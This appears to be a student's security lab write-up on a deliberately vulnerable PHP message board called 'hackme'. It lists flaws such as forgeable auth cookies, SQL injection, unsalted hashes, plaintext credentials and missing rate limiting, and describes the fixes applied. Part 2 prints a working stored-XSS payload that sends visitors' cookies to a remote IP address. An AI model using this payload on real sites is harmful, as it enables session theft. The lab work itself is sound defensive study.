#Part 1.

1. The application tries to prevent access to messages by checking for the existence of a cookie that is created when the user is authenticated and logged in. Messages can be deleted by visiting a GET URL, the link to which is only visible when the user who is viewing the message has a cookie that matches the user who created the message. Even worse, the deletion action is vulnerable to SQL injection which would allow any user to delete any post or worse.

 Unfortunately, these security policies are not adequate to prevent unauthorized access. Malicious users can easily create a cookie called "hackme" which contains the username which they wish to target. The actual message deletion action doesn't check to see if the user is authorized, anyone can enter an arbitrary message ID which they wish to delete. 

 In order to fix this I implemented PHP sessions. Rather than sending the actual username and password as a cookie, a unique session ID is set which an attacker wouldn't be able to guess (they could snoop for it, but that is addressed later). The application then checks for the existence of the session ID and makes sure it is valid. Similarly, the deletion action will check to make sure the user is actually authorized and that the ID provided is valid.

2. The database only contains password hashes. But the passwords are not salted resulting in duplication of hashes.

3. Attackers can easily snoop for user credentials for multiple reasons. Since the site is not HTTPS, usernames and passwords are sent via plantext over the network. Furthermore, the username and hashed password are stored in cookies which are sent with every network request. It would be trivial to snoop for credentials.

 To fully fix this, I would need to enable HTTPS. But I did stop saving the username and password in a cookie. Instead I use a unique PHP session ID for further authentication.

4. Login attempts are not rate limited, making brute force attacks trival.
 
 I fixed this by slowing down the number of attempts allowed per minute on a user.

5. No password scheme was implemented, users could submit anything as a password.

#Part 2

The attacker could post an image that fails to load, forcing JS to run. In this case, I wrote a simple script that sends the user's cookie to the remote server.

```
<img src="fdfjkdfjfkjdfdf.dfdjf" onerror="this.src=\'http://10.121.20.103/hackme-xss.php?c=\' + document.cookie">
```

You can view the result of this attack by visiting http://10.121.20.103/hackme-xss.php.

In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars` function in PHP when rendering the user submitted content.

